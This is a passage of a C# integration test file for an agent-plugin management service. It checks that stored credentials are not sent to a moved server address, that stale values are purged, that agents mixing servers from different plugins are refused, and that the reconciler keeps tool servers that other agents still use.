        Assert.Contains("name at least one tool", await everyTool.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.Equal(HttpStatusCode.BadRequest, withMemory.StatusCode);
        Assert.Contains("third-party", await withMemory.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));

        // The same agent written into git by hand, around the form: the inspector and the reconciler hold it too.
        _git.PushToBranch("hand/x4", AgentFiles(new AgentDraft("x4", "d", "default-model-config", "x", [], [new McpToolChoice("docs-search", ["search_docs"])],
            [new StudioGrant("company", true, false)], null)));
        var hand = _git.OpenPull("hand/x4", "x4", "Agent: x4\nProposed-by: x\n");
        var detail = await _supervisor.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{hand}", TestContext.Current.CancellationToken);
        Assert.Contains(detail.GetProperty("problems").EnumerateArray(), p => p.GetString()!.Contains("third-party"));
        foreach (var (path, content) in _git.Repos[Repo]["hand/x4"].Where(f => f.Key.StartsWith("agents/x4/")))
            _git.Main()[path] = content;
        await ReconcileAsync();
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/x4"));
    }

    [Fact]
    public async Task AStrayServerFile_NamedLikeTheOwnersServer_ChangesNothingForIt()
    {
        _kagent.ToolServers[$"{Ns}/jira"] = new JsonObject();
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_supervisor,
            await ProposeAsync(Form("jira-helper", tools: [new { server = "jira", tools = new[] { "search_issues" } }])))).StatusCode);
        _git.Main()["plugins/stray/mcp/jira.yaml"] = "kind: Whatever\n";
        _kagent.AgentObjects.TryRemove($"{Ns}/jira-helper", out _);

        await ReconcileAsync();

        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/jira-helper"));
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/jira"));
        Assert.Empty(_kagent.CallsTo("DELETE", $"/api/toolservers/{Ns}/jira"));
    }

    [Fact]
    public async Task AnAgentProposal_UsingAPluginServerThatWaitsForASecret_IsMerged_ButHeld()
    {
        await MergedPluginAsync(TwoServers(kind: "zip"));
        Assert.False(_kagent.ToolServers.ContainsKey($"{Ns}/gh-tools"));

        var merge = await MergeAsync(_supervisor, await ProposeAsync(Form("uses-gh", tools: [new { server = "gh-tools", tools = new[] { "list_issues" } }])));

        Assert.Equal(HttpStatusCode.Accepted, merge.StatusCode);
        Assert.Contains("gh-tools is not running", await merge.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/uses-gh"));
        await ReconcileAsync();
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/uses-gh"));
    }

    // --- Round 1 fixes ---

    // D219: a plugin server another agent uses never leaves while that agent is still in main.
    [Fact]
    public async Task APluginServer_AnotherAgentUses_IsNotDropped_ByUninstall_ByAnUpdate_NorByTheReconciler()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_supervisor,
            await ProposeAsync(Form("uses-docs", tools: [new { server = "docs-search", tools = new[] { "search_docs" } }])))).StatusCode);

        var uninstall = await SendAsync(new UninstallPluginCommand(_builderUser, "docs"));
        Assert.Equal((OutcomeStatus.Conflict, "in-use"), (uninstall.Status, uninstall.Reason));
        Assert.Contains("The server 'docs-search' is used by uses-docs", uninstall.Message);

        // A new version that drops the server: proposed, but not mergeable while uses-docs needs it.
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, Docs(kind: "zip", server: "docs-index"))).Status);
        var update = await MergeAsync(_owner, _git.Pulls.Last().Number);
        Assert.Equal(HttpStatusCode.Conflict, update.StatusCode);
        Assert.Contains("is used by uses-docs", await update.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));

        // main edited by hand around the gate: the reconciler keeps the server and says why.
        foreach (var path in _git.Main().Keys.Where(k => k.StartsWith("plugins/docs/") || k.StartsWith("agents/doc-helper/")).ToList())
            _git.Main().Remove(path);
        // Kept for a person to change uses-docs, not a failure the next pass would retry.
        Assert.Equal(0, await ReconcileAsync());
        await _owner.PostAsync("/api/studio/confirm", null, TestContext.Current.CancellationToken);
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper"));
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/uses-docs"));
        // A steady state waiting for a person: one Warning per pass, not an Error per server (cr3#7).
        var kept = KeptLines();
        Assert.NotEmpty(kept);
        Assert.All(kept, l => Assert.Contains("\"@l\":\"Warning\"", l));
        Assert.DoesNotContain("Studio keeps the plugin server \\\"", _console.ToString());
        Assert.Contains("docs-search (used by uses-docs)", kept[0]);
    }

    // D220: values an install stored for a proposal that never merged do not outlive it.
    [Fact]
    public async Task StoredValues_OfAClosedProposal_AreDeleted_AndAReinstallInheritsNothing()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        Assert.Contains((await SendAsync(new PluginServerRecordsQuery())).Value!, r => r.Server == "docs-search");

        var closed = await _builder.PostAsync($"/api/studio/proposals/{_git.Pulls.Single().Number}/close", null, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);
        Assert.Empty((await SendAsync(new PluginServerRecordsQuery())).Value!);
        var again = await InstallAsync(_builderUser, Docs() with { Servers = [DocsServer() with { Headers = [new PluginHeader("X-Api-Key", "${KEY}", null)] }] });
        Assert.Equal(OutcomeStatus.Created, again.Status);
        Assert.DoesNotContain("kept", _git.Pulls.Last().Body);
        Assert.Contains("needs a value from the owner", _git.Pulls.Last().Body);
    }

    [Fact]
    public async Task StoredValues_OfAProposalClosedInGit_AreDeletedByThePass_OnceOld()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs("open", agent: "open-helper", server: "open-search"))).Status);
        _git.Pulls[0].Open = false;

        await ReconcileAsync();
        Assert.Equal(2, (await SendAsync(new PluginServerRecordsQuery())).Value!.Count); // young: an install may be opening its proposal

        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");
        await ReconcileAsync();

        // The closed proposal's values are gone; the open one's stay.
        Assert.Equal(["open-search"], (await SendAsync(new PluginServerRecordsQuery())).Value!.Select(r => r.Server));
        Assert.Contains("Studio deleted the stored header values of the plugin server \\\"docs-search\\\"", _console.ToString()); // JSON log
    }

    // D220: the owner's credential is never sent to a host it was not entered for.
    [Fact]
    public async Task AServerMovingToAnotherHost_DoesNotTakeItsStoredValues_UntilTheOwnerEntersThemAgain()
    {
        await MergedPluginAsync(TwoServers(kind: "zip"));
        Assert.Equal(OutcomeStatus.Ok, (await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "gh-tools", Values("Authorization", GitHubToken)))).Status);
        await ReconcileAsync();
        await WaitUntilAsync(() => _kagent.ToolServers.ContainsKey($"{Ns}/gh-tools"), "gh-tools with the owner's value");

        var moved = TwoServers(kind: "zip") with
        {
            Servers = [DocsServer(), new PluginServerDraft("gh-tools", "GitHub tools", "SSE", "https://collector.example.net/sse",
                [new PluginHeader("Authorization", "Bearer ${GITHUB_TOKEN}", null)])]
        };
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, moved)).Status);
        var pull = _git.Pulls.Last();
        Assert.Contains("gh-tools: its address moves from https://gh.example.com/sse to https://collector.example.net/sse", pull.Body);
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_owner, pull.Number)).StatusCode);

        var gh = (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single().Servers.Single(s => s.Name == "gh-tools");
        Assert.Equal(PluginServerStates.NeedsSecret, gh.State);
        // The value held is for the old address, so the header shows as still to enter (cr3#5).
        Assert.False(Assert.Single(gh.Headers).HasValue);
        Assert.Equal("https://gh.example.com/sse", _kagent.ToolServers[$"{Ns}/gh-tools"]["spec"]!["url"]!.GetValue<string>());
        Assert.DoesNotContain(_kagent.CallsTo("POST", "/api/toolservers"), c => c.Body!.ToJsonString().Contains("collector.example.net"));

        Assert.Equal(OutcomeStatus.Ok, (await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "gh-tools", Values("Authorization", "Bearer for-the-collector")))).Status);
        await ReconcileAsync();
        await WaitUntilAsync(() => _kagent.ToolServers.TryGetValue($"{Ns}/gh-tools", out var s) && s["spec"]!["url"]!.GetValue<string>().Contains("collector"), "the re-entered value");
        Assert.Equal("Bearer for-the-collector", _kagent.SecretData[$"{SecretOf("gh-tools")}/authorization"].Value);
        Assert.DoesNotContain(_kagent.SecretData.Values, v => v.Value == GitHubToken);
    }

    [Fact]
    public async Task AHandEdit_MovingAServer_IsNotedForTheReviewer()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        await InstallAsync(_ownerUser, Docs(kind: "zip") with { Description = "Documentation helpers, v2" });
        var pull = _git.Pulls.Last();
        var head = _git.Repos[Repo][pull.Head];
        _git.PushToBranch(pull.Head, new() { ["plugins/docs/mcp/docs-search.yaml"] = head["plugins/docs/mcp/docs-search.yaml"].Replace("docs.example.com", "elsewhere.example.org") });

        var detail = await _owner.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{pull.Number}", TestContext.Current.CancellationToken);

        Assert.Contains(detail.GetProperty("notes").EnumerateArray(), n => n.GetString()!.Contains("moves to https://elsewhere.example.org"));
        Assert.True(detail.GetProperty("needsOwner").GetBoolean());
    }

    // D223: kagent lists the server before it has its tools (a Secret it retries for about a minute).
    [Fact]
    public async Task AServerKagentHasNoToolsFrom_IsStarting_AndItsAgentIsNotLiveYet()
    {
        _kagent.DiscoveredTools[$"{Ns}/docs-search"] = [];
        await MergedPluginAsync(Docs(kind: "zip"));

        var docs = (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single();

        Assert.Equal(PluginServerStates.Starting, docs.Servers.Single().State);
        Assert.False(docs.Agents.Single().Live);
        _kagent.DiscoveredTools[$"{Ns}/docs-search"] = ["search_docs"];
        docs = (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single();
        Assert.Equal(PluginServerStates.Deployed, docs.Servers.Single().State);
        Assert.True(docs.Agents.Single().Live);
    }

    // D223: the overview reads agents from kagent's one list, never git per agent, and flags unknown tool names.
    [Fact]
    public async Task TheOverview_ReadsNoAgentFile_AndFlagsAToolTheServerDoesNotOffer()
    {
        _kagent.DiscoveredTools[$"{Ns}/docs-search"] = ["search_docs"];
        await MergedPluginAsync(Docs(kind: "zip") with { Agents = [Agent("doc-helper", "docs-search") with { McpTools = [new McpToolChoice("docs-search", ["search_docs", "ask_question"])] }] });
        var before = _git.Calls.Count;

        var docs = (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single();

        Assert.DoesNotContain(_git.Calls.Skip(before), c => c.Path.Contains("/raw/agents/"));
        Assert.Equal("doc-helper answers from the docs", docs.Agents.Single().Description);
        Assert.Equal("The agent 'doc-helper' names tools that docs-search does not offer: ask_question (it offers search_docs).", Assert.Single(docs.Warnings));
    }

    // D222: one name, one plugin: never two open proposals racing for a server, never another plugin's stored values.
    [Fact]
    public async Task AServerName_InAnotherPluginsOpenProposal_IsRefused_AndItsValuesAreNotTakenOver()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);

        var rival = await InstallAsync(_builderUser, Docs("rival", agent: "rival-helper"));
        var takeover = await SendAsync(new StorePluginServerValuesCommand("owner-1", "docs-search", "rival", Values("X-Api-Key", "mine-now-123456"), false, "https://docs.example.com"));

        Assert.Equal((OutcomeStatus.Conflict, "pending"), (rival.Status, rival.Reason));
        Assert.Contains("The server 'docs-search' is in the open proposal of the plugin 'docs'", rival.Message);
        Assert.Equal((OutcomeStatus.Conflict, "taken"), (takeover.Status, takeover.Reason));
        Assert.Equal(Literal, (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!.Values["X-Api-Key"]);
    }

    // D220: the owner is told where the values' protection is weak and who acts with them.
    [Fact]
    public async Task TheOwnerIsTold_ThatTheKeyRingIsInClear_AndThatEveryChatUserActsWithTheCredential()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, TwoServers())).Status);

        Assert.True((await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.KeyRingInClear); // Production, no certificate
        Assert.Contains("Identity:DataProtectionCertificatePath is not set", _console.ToString());
        Assert.Contains("gh-tools: every chat user of this plugin's agents acts at https://gh.example.com/sse with these header values", _git.Pulls.Single().Body);
    }

    // D222: an agent a plugin owns changes through its plugin, not on the form (its next update would overwrite the form).
    [Fact]
    public async Task APluginsAgent_IsNotProposedNorEditedOnTheForm()
    {
        await MergedPluginAsync(Docs(kind: "zip"));

        var proposed = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("doc-helper"), cancellationToken: TestContext.Current.CancellationToken);
        var edited = await SendAsync(new EditDraftQuery(_builderUser, "doc-helper"));

        Assert.Equal(HttpStatusCode.Conflict, proposed.StatusCode);
        Assert.Equal("plugin", (await proposed.Content.ReadFromJsonAsync<JsonElement>(TestContext.Current.CancellationToken)).GetProperty("reason").GetString());
        Assert.Equal((OutcomeStatus.Conflict, "plugin"), (edited.Status, edited.Reason));
        Assert.Contains("belongs to the plugin 'docs'", edited.Message);
    }

    [Fact]
    public void TheConfigTemplate_HasThePluginsSettings()
    {
        var template = JsonDocument.Parse(File.ReadAllText(Infrastructure.Repo.Path("appsettings.template.json"))).RootElement;

        Assert.Equal("", template.GetProperty("Studio").GetProperty("PluginModelConfig").GetString());
        var plugins = template.GetProperty("Plugins");
        Assert.Equal(["AllowHttp", "AllowPrivateNetworks", "AllowPrivateServers", "GitHosts", "MaxDownloadBytes"],
            plugins.EnumerateObject().Select(p => p.Name).Order(StringComparer.Ordinal));
        Assert.False(plugins.GetProperty("AllowPrivateServers").GetBoolean());
    }

    // --- Round 2 fixes ---

    // D220: a proposal merged between the pass's two reads of git is in main by the purge, never in neither.
    [Fact]
    public async Task APluginProposal_MergedWhileThePassRuns_KeepsItsStoredValues()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");
        var pull = _git.Pulls.Single();
        _git.OnRequest = (method, path) =>
        {
            if (method != "GET" || !path.EndsWith("/pulls"))
                return;
            _git.OnRequest = null;
            _git.Repos[Repo]["main"] = new Dictionary<string, string>(_git.Repos[Repo][pull.Head]);
            pull.Open = false;
            pull.Merged = true;
        };

        await ReconcileAsync();

        Assert.Null(_git.OnRequest); // the merge landed during the pass
        Assert.Equal(Literal, (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!.Values["X-Api-Key"]);
        await ReconcileAsync();
        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
    }

    // D220: values held for a moved server stay with the running one until the move is merged; the owner then enters them.
    [Fact]
    public async Task AnInstall_MovingAServerWithALiteralValue_LeavesTheRunningServersValues_UntilTheMoveIsMerged()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        var running = _kagent.ToolServers[$"{Ns}/docs-search"]["spec"]!.ToJsonString();
        var moved = Docs(kind: "zip", url: "https://elsewhere.example.org/mcp") with
        {
            Servers = [DocsServer("https://elsewhere.example.org/mcp") with { Headers = [new PluginHeader("X-Api-Key", null, "moved-literal-value-987")] }]
        };

        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, moved)).Status);

        var pull = _git.Pulls.Last();
        Assert.Contains("docs-search: its address moves from https://docs.example.com/mcp to https://elsewhere.example.org/mcp", pull.Body);
        Assert.Contains("the owner enters the values after merge (X-Api-Key)", pull.Body);
        var stored = (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!;
        Assert.Equal((Literal, "https://docs.example.com/mcp"), (stored.Values["X-Api-Key"], stored.Address));
        var docs = (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single();
        Assert.Equal(PluginServerStates.Deployed, docs.Servers.Single().State);
        Assert.True(docs.Agents.Single().Live);
        var detail = await _owner.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{pull.Number}", TestContext.Current.CancellationToken);
        Assert.Contains(detail.GetProperty("notes").EnumerateArray(), n => n.GetString()!.Contains("moves to https://elsewhere.example.org/mcp"));
        // Memory refuses an install's store over values held for another address, whoever calls it.
        var direct = await SendAsync(new StorePluginServerValuesCommand("owner-1", "docs-search", "docs", Values("X-Api-Key", "moved-literal-value-987"), true,
            "https://elsewhere.example.org/mcp"));
        Assert.Equal((OutcomeStatus.Conflict, "moved"), (direct.Status, direct.Reason));

        // Closed: nothing changed. Merged: the server waits for the owner, and the old value never goes to the new address.
        Assert.Equal(HttpStatusCode.OK, (await _owner.PostAsync($"/api/studio/proposals/{pull.Number}/close", null, TestContext.Current.CancellationToken)).StatusCode);
        Assert.Equal(Literal, (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!.Values["X-Api-Key"]);
        await MergedPluginAsync(moved);
        Assert.Equal(PluginServerStates.NeedsSecret, (await SendAsync(new PluginsOverviewQuery(_ownerUser))).Value!.Plugins.Single().Servers.Single().State);
        Assert.Equal(running, _kagent.ToolServers[$"{Ns}/docs-search"]["spec"]!.ToJsonString());
        Assert.Equal(OutcomeStatus.Ok, (await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "docs-search", Values("X-Api-Key", "for-elsewhere-value-1")))).Status);
        // The entry pokes the loop, whose pass may hold the lock this one then skips: wait for the result, not for a pass.
        await ReconcileAsync();
        await WaitUntilAsync(() => _kagent.ToolServers[$"{Ns}/docs-search"]["spec"]!["url"]!.GetValue<string>().Contains("elsewhere.example.org"), "the moved server");
        Assert.Equal("for-elsewhere-value-1", _kagent.SecretData[$"{SecretOf("docs-search")}/x-api-key"].Value);
    }

    // D220: a row another plugin left (its proposal closed in git) does not block the server's new plugin for good.
    [Fact]
    public async Task ARowAnotherPluginLeftBehind_IsPurged_AndTheServersNewPluginTakesValues()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        _git.Pulls[0].Open = false;
        var rival = Docs("rival", kind: "zip", agent: "rival-helper") with { Servers = [DocsServer() with { Headers = [new PluginHeader("X-Api-Key", "${KEY}", null)] }] };
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_ownerUser, rival)).Status);
        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");

        await ReconcileAsync();

        Assert.Empty((await SendAsync(new PluginServerRecordsQuery())).Value!);
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_owner, _git.Pulls.Last().Number)).StatusCode);
        Assert.Equal(OutcomeStatus.Ok, (await SendAsync(new SetPluginServerSecretsCommand(_ownerUser, "docs-search", Values("X-Api-Key", "rival-value-0123")))).Status);
        Assert.Equal("rival", (await SendAsync(new PluginServerRecordsQuery())).Value!.Single().Plugin);
    }

    // D220: storing the same values again still renews the record, so the grace period covers a reinstall's proposal.
    [Fact]
    public async Task StoringTheSameValuesAgain_RenewsTheRecord_WithoutANewFingerprint()
    {
        var store = new StorePluginServerValuesCommand("owner-1", "docs-search", "docs", Values("X-Api-Key", Literal), true, "https://docs.example.com/mcp");
        var first = (await SendAsync(store)).Value;
        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");

        var again = (await SendAsync(store)).Value;

        Assert.Equal(first, again);
        Assert.True((await SendAsync(new PluginServerRecordsQuery())).Value!.Single().UpdatedAt > DateTime.UtcNow.AddMinutes(-5));
    }

    // A purge that fails is logged; the pass and a close still finish.
    [Fact]
    public async Task APurgeThatFails_NeitherFailsThePass_NorTheClose()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");
        _kagent.AgentObjects.TryRemove($"{Ns}/skanyxx-factory", out _);
        _git.OnRequest = (method, path) =>
        {
            if (method == "GET" && path.EndsWith("/pulls"))
                _git.Down = true;
        };

        await ReconcileAsync();

        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/skanyxx-factory"));
        Assert.Contains("Studio could not delete stale plugin header values", _console.ToString());
        _git.Down = false;
        _git.OnRequest = (method, path) =>
        {
            if (method == "DELETE" && path.Contains("/branches/"))
                _git.Down = true;
        };

        var closed = await _builder.PostAsync($"/api/studio/proposals/{_git.Pulls.Single().Number}/close", null, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);
        Assert.Contains("could not be deleted yet", await closed.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.False(_git.Pulls.Single().Open);
        Assert.Single((await SendAsync(new PluginServerRecordsQuery())).Value!);
        _git.OnRequest = null;
        _git.Down = false;
        await ReconcileAsync();
        Assert.Empty((await SendAsync(new PluginServerRecordsQuery())).Value!);
    }

    // A request asks one file per agent for the servers it uses, and leaves logging what is invalid to the pass.
    [Fact]
    public async Task UninstallAndInspection_ReadOneFilePerAgent_AndLogNothingInvalid()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        await MergedAgentAsync("plain");
        _git.Main()["agents/broken/agent.yaml"] = "spec: [";
        _git.Main()["agents/broken/grants.yaml"] = "agent: broken\n";
        var (calls, log) = (_git.Calls.Count, _console.ToString().Length);

        Assert.Equal(OutcomeStatus.Created, (await SendAsync(new UninstallPluginCommand(_builderUser, "docs"))).Status);
        var detail = await _owner.GetFromJsonAsync<JsonElement>($"/api/studio/proposals/{_git.Pulls.Last().Number}", TestContext.Current.CancellationToken);

        Assert.Empty(detail.GetProperty("problems").EnumerateArray());
        var reads = _git.Calls.Skip(calls).Where(c => c.Path.Contains("/raw/agents/")).Select(c => c.Path).ToList();
        Assert.Contains(reads, p => p.Contains("agents/plain/agent.yaml"));
        Assert.DoesNotContain(reads, p => p.Contains("grants.yaml"));
        Assert.DoesNotContain("Studio skips", _console.ToString()[log..]);
    }

    // D219: an agent no plugin owns never lets one party's content steer another party's credential or the owner's tools.
    [Fact]
    public async Task AnAgent_MixingTwoPluginsServers_OrAPluginServerAndAnAllowListedOne_IsRefused_OnTheFormAndInTheReconciler()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        await MergedPluginAsync(Docs("other", kind: "zip", agent: "other-helper", server: "other-search"));

        var twoPlugins = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("mixer", tools:
            [new { server = "docs-search", tools = new[] { "search_docs" } }, new { server = "other-search", tools = new[] { "search_docs" } }]), TestContext.Current.CancellationToken);
        var withJira = await _builder.PostAsJsonAsync("/api/studio/proposals", Form("mixer", tools:
            [new { server = "docs-search", tools = new[] { "search_docs" } }, new { server = "jira", tools = new[] { "search_issues" } }]), TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.BadRequest, twoPlugins.StatusCode);
        Assert.Contains("belong to different plugins", await twoPlugins.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.Equal(HttpStatusCode.BadRequest, withJira.StatusCode);
        Assert.Contains("beside an allow-listed server (jira)", await withJira.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.Equal(HttpStatusCode.Created, (await _builder.PostAsJsonAsync("/api/studio/proposals", Form("reader", tools:
            [new { server = "docs-search", tools = new[] { "search_docs" } }]), TestContext.Current.CancellationToken)).StatusCode);

        foreach (var (path, text) in AgentFiles(new AgentDraft("mixer", "d", "default-model-config", "x", [],
                     [new McpToolChoice("docs-search", ["search_docs"]), new McpToolChoice("other-search", ["search_docs"])], [], null)))
            _git.Main()[path] = text!;
        await ReconcileAsync();

        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/mixer"));
        Assert.Contains("belong to different plugins", _console.ToString());
    }

    // D005 in the reconciler too: a hand edit of main gives a plugin's agent no memory, and an agent two plugins list runs for neither.
    [Fact]
    public async Task APluginsAgent_EditedInMain_IsHeldToItsRecipe_AndOneTwoPluginsList_IsNeverApplied()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        foreach (var (path, text) in AgentFiles(Agent("doc-helper", "docs-search") with { Grants = [new StudioGrant("company", true, false)] }))
            _git.Main()[path] = text!;

        await ReconcileAsync();

        Assert.Contains("never has memory grants or kagent TTL memory (recipes only)", _console.ToString());
        Assert.Empty((await SendAsync(new StudioPrincipalQuery("doc-helper"))).Value!.Grants);
        Assert.False(_kagent.ToolServers.ContainsKey($"{Ns}/skanyxx-memory-doc-helper"));

        foreach (var (path, text) in AgentFiles(Agent("doc-helper", "docs-search")))
            _git.Main()[path] = text!;
        var manifest = _git.Main()["plugins/docs/plugin.yaml"];
        Assert.Contains("\nname: docs\n", manifest);
        _git.Main()["plugins/twin/plugin.yaml"] = manifest.Replace("\nname: docs\n", "\nname: twin\n");
        _kagent.AgentObjects.TryRemove($"{Ns}/doc-helper", out _);

        await ReconcileAsync();

        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper"));
        Assert.Contains("More than one plugin lists the agent", _console.ToString());
    }

    // --- Round 3 fixes ---

    // cr3#1: a folder in main the strict reader refuses still runs as it was, so it still counts as a user of its servers.
    [Fact]
    public async Task AnInvalidAgentFolder_StillCountsAsAUser_OfAServerLeavingMain()
    {
        await MergedPluginAsync(Docs(kind: "zip"));
        Assert.Equal(HttpStatusCode.OK, (await MergeAsync(_supervisor,
            await ProposeAsync(Form("uses-docs", tools: [new { server = "docs-search", tools = new[] { "search_docs" } }])))).StatusCode);
        _git.Main().Remove("agents/uses-docs/grants.yaml");
        foreach (var path in _git.Main().Keys.Where(k => k.StartsWith("plugins/docs/") || k.StartsWith("agents/doc-helper/")).ToList())
            _git.Main().Remove(path);

        Assert.Equal(0, await ReconcileAsync());
        await _owner.PostAsync("/api/studio/confirm", null, TestContext.Current.CancellationToken);

        Assert.True(_kagent.ToolServers.ContainsKey($"{Ns}/docs-search"));
        Assert.True(_kagent.AgentObjects.ContainsKey($"{Ns}/uses-docs"));
        Assert.False(_kagent.AgentObjects.ContainsKey($"{Ns}/doc-helper"));
        Assert.Contains("docs-search (used by uses-docs)", KeptLines()[0]);
    }

    // cr3#2: values a reinstall stores while a close is landing are not deleted by that close.
    [Fact]
    public async Task ValuesStoredWhileACloseLands_AreNotPurgedByIt()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        _git.OnRequest = (method, path) =>
        {
            if (method != "DELETE" || !path.Contains("/branches/"))
                return;
            _git.OnRequest = null;
            // The PR is closed by now, so a reinstall may store: the row is renewed after the close began.
            using var connection = new NpgsqlConnection(_database);
            connection.Open();
            using var command = new NpgsqlCommand("UPDATE memory_studio_plugin_servers SET updated_at = now()", connection);
            command.ExecuteNonQuery();
        };

        var closed = await _builder.PostAsync($"/api/studio/proposals/{_git.Pulls.Single().Number}/close", null, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);
        Assert.Null(_git.OnRequest);
        Assert.Equal(Literal, (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!.Values["X-Api-Key"]);
    }

    // cr3#3: the close's purge is best effort whatever fails in it (here the database); the close itself stands.
    [Fact]
    public async Task AClosePurgeFailingInTheDatabase_StillClosesWith200()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        _git.OnRequest = (method, path) =>
        {
            if (method != "DELETE" || !path.Contains("/branches/"))
                return;
            _git.OnRequest = null;
            using var connection = new NpgsqlConnection(_database);
            connection.Open();
            using var command = new NpgsqlCommand("ALTER TABLE memory_studio_plugin_servers RENAME TO memory_studio_plugin_servers_away", connection);
            command.ExecuteNonQuery();
        };

        var closed = await _builder.PostAsync($"/api/studio/proposals/{_git.Pulls.Single().Number}/close", null, TestContext.Current.CancellationToken);

        Assert.Equal(HttpStatusCode.OK, closed.StatusCode);
        Assert.Contains("could not be deleted yet", await closed.Content.ReadAsStringAsync(TestContext.Current.CancellationToken));
        Assert.False(_git.Pulls.Single().Open);
        await ExecuteAsync("ALTER TABLE memory_studio_plugin_servers_away RENAME TO memory_studio_plugin_servers");
        await ExecuteAsync("UPDATE memory_studio_plugin_servers SET updated_at = now() - interval '2 hours'");
        await ReconcileAsync();
        Assert.Empty((await SendAsync(new PluginServerRecordsQuery())).Value!);
    }

    // cr3#4: an unclaimed row at another address runs nowhere; a reinstall replaces it instead of being told it moves.
    [Fact]
    public async Task AnUnclaimedRowAtAnotherAddress_IsReplacedByAReinstall()
    {
        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, Docs())).Status);
        // Closed in git, its branch deleted: the row stays, unclaimed, until the pass purges it.
        _git.Pulls[0].Open = false;
        _git.Repos[Repo].Remove(_git.Pulls[0].Head);
        var moved = Docs(url: "https://elsewhere.example.org/mcp") with
        {
            Servers = [DocsServer("https://elsewhere.example.org/mcp") with { Headers = [new PluginHeader("X-Api-Key", null, "elsewhere-literal-0123")] }]
        };

        Assert.Equal(OutcomeStatus.Created, (await InstallAsync(_builderUser, moved)).Status);

        var body = _git.Pulls.Last().Body;
        Assert.DoesNotContain("its address moves", body);
        Assert.DoesNotContain("kept", body);
        var stored = (await SendAsync(new PluginServerValuesQuery("docs-search"))).Value!;
        Assert.Equal(("elsewhere-literal-0123", "https://elsewhere.example.org/mcp"), (stored.Values["X-Api-Key"], stored.Address));
        // Memory, called directly, replaces it too: only a claimed row's values belong to a running server.
        var direct = await SendAsync(new StorePluginServerValuesCommand("owner-1", "docs-search", "docs", Values("X-Api-Key", "third-address-value"), true,
